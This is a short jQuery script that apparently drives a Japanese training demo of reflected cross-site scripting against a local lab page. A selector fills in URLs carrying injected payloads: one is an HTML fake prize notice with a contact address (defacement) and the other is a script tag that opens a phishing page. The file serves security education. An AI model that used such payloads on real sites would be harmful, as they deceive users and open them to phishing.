(function(){
  "use strict";

  //Valiable
    let selectMethodMsg = {
      '1':"想定されたケースで指定URLにアクセスします",
      '2':"攻撃コードを含むURLにアクセスさせて<span class='text-danger font-weight-bold'>偽情報を表示</span>させます（Webページ改ざん）",
      '3':"攻撃コードを含むURLにアクセスさせて<span class='text-danger font-weight-bold'>攻撃者が用意した画面に遷移</span>させます (フィッシング)"
    };

  //Event

    //入力タイプ変更  
    $("#method").on("change", changeMethod);
    //BROWSINGボタンクリック
    $("#browsing_button").on("click", clickBrowsingButton);


  //Method

    function changeMethod(e){
      var mcode = $("select[name='method']").val();
      var serverName = $("#server_name").val();
      var url = "//" + serverName + "/front/XSSReflective.php";
      $("#mcode").val(mcode);
      $("#selectMsg").html(selectMethodMsg[mcode]);
      //auto input
      switch(mcode){
        case "1":
          $("#user_browsing_url").val(url + "?userid=1001");
          break;
        case "2":
          $("#user_browsing_url").val(url + '?userid=<div>あなたは記念すべき100人目のユーザです！<br>賞金100万円を差し上げます<br>お手続きのため下記にご連絡ください<br>fishing@gmail.com</div>');
          break;
        case "3":
          $("#user_browsing_url").val(url + '?userid=<script>window.open("fishing.php")</script>');
          break;
      }

    }


    function clickBrowsingButton(){
      var url = $("#user_browsing_url").val();
      $("#form1").attr("action", url);
      $("#form1").submit();
    }

  //Init

})();